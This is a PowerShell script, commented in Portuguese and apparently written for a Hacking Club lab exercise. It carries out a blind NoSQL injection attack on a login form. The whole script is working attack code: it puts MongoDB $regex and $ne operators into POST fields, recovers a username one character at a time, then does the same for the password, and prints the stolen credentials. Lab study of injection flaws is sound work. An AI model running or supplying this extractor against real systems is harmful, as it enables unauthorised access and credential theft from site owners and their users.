#===============================================================================================#
# Descrição: Script básico em powershell destinado ao estudo de NoSQL Injection. (Hacking Club) #
# Desenvolvido por: Ivan Barbosa Kovalinkinas                                                   #
# Versão: 1.0.0 Beta                                                                            #
# Data: 27/10/2024                                                                              #
#===============================================================================================#
$contaUser = $null
$senhaUser = $null
$bodyRequest = $null
$server = 'x.p.t.o' # INFORMAR IP DO SERVIDOR

$asciiChars = @()
for ($i = 48; $i -le 57; $i++) { $asciiChars += [char]$i }
for ($i = 65; $i -le 90; $i++) { $asciiChars += [char]$i }
for ($i = 97; $i -le 122; $i++) { $asciiChars += [char]$i }
$asciiChars += [char]32 # [espaço]

[int]$controle = $null

Clear-Host
Write-Output "PROCURANDO O LOGIN: $($contaUser)"

while ($true) {

    $asciiChars | ForEach-Object{

        $bodyRequest = "username[`$regex]=^$($contaUser)$($_)&password[`$ne]=XPTO"
        
        $validacao = -not ((Invoke-WebRequest -Method Post -Uri $server -Body $bodyRequest).Content -like "*Password is required*")

        if($validacao){
            [string]$contaUser += $_
            $validacao = $false
            (Invoke-WebRequest -Method Post -Uri $server -Body $bodyRequest).Content
            [int]$controle = 0
            Clear-Host
            Write-Output "PROCURANDO O LOGIN: $($contaUser)"
        }
    }
    [int]$controle += 1

    if($controle -eq 2){ break }
}
$contaUser

$asciiChars += "\$([char]33)" # !
$asciiChars += "\$([char]36)" # $
$asciiChars += "\$([char]46)" # .
$asciiChars += "\$([char]64)" # @

$senhaUser = $null

Clear-Host
Write-Output "LOGIN: $($contaUser)`r`nPROCURANDO A SENHA: $($senhaUser.Replace('\',''))"

[int]$controle = $null
while ($true) {

    $asciiChars | ForEach-Object{
        
        $bodyRequest = "username=$($contaUser)&password[`$regex]=^$($senhaUser)$($_)"
        $validacao = -not ((Invoke-WebRequest -Method Post -Uri $server -Body $bodyRequest).Content -like "*Login ou senha inválido!*")
        if($validacao){
            [string]$senhaUser += $_
            $validacao = $false
            [int]$controle = 0
            Clear-Host
            Write-Output "LOGIN: $($contaUser) PROCURANDO A SENHA: $($senhaUser.Replace('\',''))"
        }
    }
    [int]$controle += 1

    if($controle -eq 2){ break }
}
[string]$senhaUser = $senhaUser.Replace('\','')

$bodyRequest = "username=$($contaUser)&password=$($senhaUser)"
$validacao = -not ((Invoke-WebRequest -Method Post -Uri $server -Body $bodyRequest).Content -like "*Login ou senha inválido!*")

if($validacao){
    Write-Output "`r`n########################################`r`nLOGIN: $($contaUser)`r`nSENHA: $($senhaUser)`r`n########################################"
}
else{
    Write-Output "`r`n########################################`r`nLOGIN: $($contaUser)`r`nSENHA PARCIAL: $($senhaUser)`r`n########################################"
}
